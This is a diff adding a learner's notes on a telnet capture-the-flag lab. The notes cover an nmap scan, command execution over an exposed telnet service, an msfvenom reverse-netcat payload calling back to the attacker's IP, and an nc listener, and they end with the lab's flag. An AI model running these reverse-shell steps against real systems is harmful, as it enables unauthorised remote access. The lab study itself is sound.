@@ -1,0 +1,53 @@
+ Telnet 
+---Notes---
+- Telnet is an application protocol which enables with the use of a telnet client to connect to and excute commands on a remote machine thats hosting a telnet server
+- Its a low access controlled protocol which can allow attackers to connect to and create a backdoor and to create 
+ a  reverse shell to execute remote command.
+- The client becomes a virtual terminal allowing you to interact with the remote host
+- unencrypted so it sends data in plain text.
+- But telnet has beem replaced by ssh which is ecnrypted and more secure.
+
+telnet syntax 
+---telnet [ip] [port]
+
+using nmap to scan for open  ports 
+sytax
+- nmap -A -p- [ip]
+-p- --- scans for all the open ports
+
+results of enumeration
+-name -  ---- skiddy
+-open ports - --- 8012/tcp
+
+exploitation
+steps
+1. Connected to the telnets server
+telnet 10.10.15.104 8012
+.HELP to view available commands
+
+2. Check if the machine can execute any command
+ --- create a tcpdump listener on another terminal
+--- sudo tcpdump ip proto  \\icmp -i tun0
+
+3. Ping using the through the telnet terminal
+.RUN ping ip[my local tun0 ip] -c 1
+.RUN ping ip[10.18.14.44]
+
+4. Set up a payload uing msfvenom
+msfvenom -p cmd/unix/reverse_netcat lhost=[10.18.14.44] lport=4444 R
+-p = payload
+lhost = our local host IP address (this is your machine's IP address)
+lport = the port to listen on (this is the port on your machine)
+R = export the payload in raw format.
+
+5. set up a port listener
+nc -lvp 4444
+
+6. Gaining Access 
+ls
+flag.txt
+cat flag.txt
+THM{y0u_g0t_th3_t3ln3t_fl4g}
+
+
+
